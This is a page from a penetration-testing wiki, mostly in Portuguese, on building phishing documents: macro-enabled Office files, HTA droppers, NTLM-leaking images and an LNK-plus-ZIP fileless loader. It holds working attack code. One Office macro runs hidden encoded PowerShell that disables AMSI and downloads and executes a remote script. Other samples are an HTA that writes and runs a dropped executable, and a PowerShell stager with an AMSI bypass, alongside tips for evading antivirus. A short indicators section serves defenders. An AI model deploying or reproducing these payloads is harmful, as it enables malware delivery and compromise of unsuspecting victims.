# Arquivos e Documentos de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

Microsoft Word realiza validação dos dados do arquivo antes de abri-lo. A validação é feita através da identificação da estrutura de dados, de acordo com o padrão OfficeOpenXML. Se ocorrer qualquer erro durante essa identificação da estrutura de dados, o arquivo analisado não será aberto.

Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo mudando a extensão e ainda assim manter sua capacidade de executar macros.\
Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
Os mesmos internos e mecanismos se aplicam a todo o software da Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
Arquivos DOCX que referenciam um template remoto (Arquivo –Opções –Suplementos –Gerenciar: Modelos –Ir) que inclui macros também podem “executar” macros.

### Carregamento de Imagem Externa

Vá para: _Inserir --> Partes Rápidas --> Campo_\
_**Categorias**: Links and References, **Nomes do campo**: includePicture, e **Nome do arquivo ou URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor de Macros

É possível usar macros para executar código arbitrário a partir do documento.

#### Funções de carregamento automático

Quanto mais comuns, mais provável que o AV as detecte.

- AutoOpen()
- Document_Open()

#### Exemplos de código de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Vá para **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e depois em **Remove All** ao lado de **Document Properties and Personal Information**.

#### Doc Extension

Quando terminar, selecione o dropdown **Save as type**, altere o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
Faça isso porque você **não pode salvar macros dentro de um `.docx`** e existe um **estigma** **em torno** da extensão habilitada para macros **`.docm`** (por exemplo, o ícone em miniatura tem um grande `!` e alguns gateways web/email os bloqueiam totalmente). Portanto, essa **extensão legada `.doc` é o melhor compromisso**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Existem várias maneiras de **forçar a autenticação NTLM "remotamente"**, por exemplo, você poderia adicionar **imagens invisíveis** em emails ou HTML que o usuário irá acessar (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas ao **abrir a pasta.**

**Confira essas ideias e mais nas páginas a seguir:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não esqueça que você não pode apenas roubar o hash ou a autenticação, mas também **realizar NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campanhas altamente eficazes entregam um ZIP que contém dois documentos legítimos de isca (PDF/DOCX) e um .lnk malicioso. O truque é que o loader PowerShell real está armazenado dentro dos bytes brutos do ZIP após um marcador único, e o .lnk o extrai e executa totalmente em memória.

Fluxo típico implementado pelo one-liner PowerShell do .lnk:

1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, e o diretório pai do current working directory.
2) Ler os bytes do ZIP e encontrar um marcador hardcoded (por exemplo, xFIQCV). Tudo após o marcador é o payload PowerShell embutido.
3) Copiar o ZIP para %ProgramData%, extrair lá, e abrir o .docx de isca para parecer legítimo.
4) Contornar AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar a próxima etapa (por exemplo, remover todos os caracteres #) e executá-la em memória.

Exemplo de esqueleto PowerShell para extrair e executar a etapa embutida:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- A entrega frequentemente abusa de subdomínios reputáveis de PaaS (por exemplo, *.herokuapp.com) e pode restringir payloads (servir ZIPs benignos com base no IP/UA).
- A próxima etapa frequentemente decifra base64/XOR shellcode e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos no disco.

Persistência usada na mesma cadeia
- COM TypeLib hijacking do Microsoft Web Browser control de modo que o IE/Explorer ou qualquer app que o incorpore reexecute o payload automaticamente. Veja detalhes e comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arquivos ZIP contendo a string marcador ASCII (por exemplo, xFIQCV) anexada aos dados do arquivo.
- .lnk que enumera pastas pai/usuário para localizar o ZIP e abre um documento de isca.
- Alteração do AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads de negócio de longa duração terminando com links hospedados sob domínios PaaS confiáveis.

## Referências

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
